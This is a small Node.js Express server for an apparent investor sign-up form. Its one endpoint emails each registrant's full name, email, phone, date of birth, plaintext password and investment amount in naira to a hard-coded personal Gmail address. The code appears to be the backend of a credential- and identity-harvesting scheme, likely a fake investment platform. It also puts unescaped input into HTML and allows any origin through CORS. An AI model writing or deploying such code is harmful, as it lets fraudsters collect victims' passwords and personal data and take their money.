const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.post('/send-email', async (req, res) => {
  const user = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER, // use this safely from .env
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'parkjimmm205@gmail.com',
    subject: 'New Investor Registered',
    html: `
      <h3>New Investor Notification</h3>
      <p><strong>Full Name:</strong> ${user.name}</p>
      <p><strong>Email:</strong> ${user.email}</p>
      <p><strong>Phone:</strong> ${user.phone}</p>
      <p><strong>Date of Birth:</strong> ${user.dob}</p>
      <p><strong>Password:</strong> ${user.password}</p>
      <p><strong>Investment Amount:</strong> ₦${user.investment?.amount || 'N/A'}</p>
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "Email sent successfully" });
  } catch (error) {
    res.status(500).json({ error: error.toString() });
  }
});

app.listen(5000, () => {
  console.log("Server running on http://localhost:5000");
});